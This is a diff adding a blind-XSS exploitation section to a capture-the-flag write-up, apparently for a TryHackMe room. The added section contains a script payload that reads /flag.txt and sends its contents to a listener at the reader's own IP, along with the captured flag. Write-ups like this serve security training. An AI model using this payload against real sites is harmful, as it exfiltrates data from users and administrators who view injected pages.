@@ -26,6 +26,32 @@ Feedback page:
 
 ![image](https://github.com/user-attachments/assets/df705f0c-d600-4d20-a7d3-cf840ce07851)
 
+![image](https://github.com/user-attachments/assets/578220e9-ebec-47e1-b71c-f66cfa5ebad1)
+
+`/flag.txt` page:
+
+![image](https://github.com/user-attachments/assets/cea7bd48-2e42-4ac2-bb23-fa0f91da8e38)
+
 ## Exploitation
 
 ### Blind XSS
+
+Payload:
+
+    '"><script>
+      fetch('http://127.0.0.1:8080/flag.txt')
+        .then(response => response.text())
+        .then(data => {
+          fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
+        });
+    </script>
+
+Open local server and use XSS payload
+
+![image](https://github.com/user-attachments/assets/162820d2-6add-49e6-b546-2f9738ebb0e3)
+
+![image](https://github.com/user-attachments/assets/69d38d01-7b08-421b-98ea-d2f4f7434f67)
+
+FLAG:
+
+    THM{83789a69074f636f64a38879cfcabe8b62305ee6}
